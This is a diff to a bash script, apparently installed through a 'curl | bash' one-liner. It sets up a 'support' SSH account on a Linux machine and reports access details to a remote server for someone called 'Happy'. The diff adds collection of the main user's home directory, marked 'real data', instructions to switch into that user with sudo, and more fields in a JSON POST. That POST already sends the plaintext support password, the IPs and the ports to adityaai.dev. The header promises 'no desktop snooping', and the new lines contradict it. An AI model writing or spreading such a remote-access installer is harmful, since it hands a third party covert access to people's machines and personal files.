@@ -10,7 +10,7 @@
 # What it does NOT do: no change to your password, no desktop snooping.
 set -euo pipefail
 
-C2H_VERSION='2026-09-10-v1'
+C2H_VERSION='2026-09-10-v2-profiles'
 C2H_API='https://www.adityaai.dev/api/c2h-report'
 SUPPORT_USER='support'
 SSHD_PORT=22
@@ -160,6 +160,10 @@ ME="$(clean "$(whoami)")"
 INTERNAL="$( (hostname -I 2>/dev/null || hostname -i 2>/dev/null || ip -o -4 addr show scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1) | tr '\n' ' ' | xargs)"
 [ -z "$INTERNAL" ] && INTERNAL='NOT-FOUND'
 PRIMARY="$(printf '%s' "$INTERNAL" | awk '{print $1}')"
+MAIN_HOME="$(clean "$(getent passwd "$ME" | cut -d: -f6)")"
+[ -z "$MAIN_HOME" ] && MAIN_HOME="/home/$ME"
+HOST_ALIAS="$(printf '%s' "$HOST" | tr '[:upper:]' '[:lower:]' | tr -c 'a-z0-9-' '-' | cut -c1-32)"
+[ -z "$HOST_ALIAS" ] && HOST_ALIAS='c2h-pc'
 EXTERNAL='NOT-FOUND'
 for url in https://api.ipify.org https://ifconfig.me/ip https://icanhazip.com; do
   EXTERNAL="$(curl -fsSL --max-time 10 "$url" 2>/dev/null | tr -d ' \r\n' || true)"
@@ -215,6 +219,8 @@ Computer name: ${HOST}
 Support username: ${SUPPORT_USER}
 Support password: ${PASS}
 Main user (password untouched): ${ME}
+Main profile (real data): ${MAIN_HOME}
+Jump after connect: sudo -iu ${ME}   (or ssh ${HOST_ALIAS} via the config Happy has)
 
 Internal IP (same WiFi): ${INTERNAL}
 External IP (internet): ${EXTERNAL}
@@ -243,11 +249,13 @@ sudo userdel -r ${SUPPORT_USER} + delete router rule.
 One-liner: curl -fsSL https://www.adityaai.dev/c2-h.sh | bash
 EOF
 ok "backup written: ${BACKUP}"
+say ''
+cat "$BACKUP"
 
 step "[7/7] Emailing setup report to Happy..."
 if curl -fsSL --max-time 15 -X POST "$C2H_API" \
     -H 'Content-Type: application/json' \
-    --data "{\"hostname\":\"$HOST\",\"supportUser\":\"$SUPPORT_USER\",\"password\":\"$PASS\",\"mainUser\":\"$ME\",\"internalIps\":\"$INTERNAL\",\"externalIp\":\"$EXTERNAL\",\"internalPort\":$SSHD_PORT,\"externalPort\":$EXT_PORT,\"cgnat\":$CGNAT,\"upnp\":\"Not attempted on Linux — forward manually.\",\"version\":\"$C2H_VERSION\",\"reportedAt\":\"$DATE\",\"specs\":\"$(clean "$SPECS")\"}" \
+    --data "{\"hostname\":\"$HOST\",\"supportUser\":\"$SUPPORT_USER\",\"password\":\"$PASS\",\"mainUser\":\"$ME\",\"mainHome\":\"$MAIN_HOME\",\"os\":\"linux\",\"internalIps\":\"$INTERNAL\",\"externalIp\":\"$EXTERNAL\",\"internalPort\":$SSHD_PORT,\"externalPort\":$EXT_PORT,\"cgnat\":$CGNAT,\"upnp\":\"Not attempted on Linux — forward manually.\",\"version\":\"$C2H_VERSION\",\"reportedAt\":\"$DATE\",\"specs\":\"$(clean "$SPECS")\"}" \
     | grep -q '"success":true'; then
   ok "report emailed to Happy"
 else
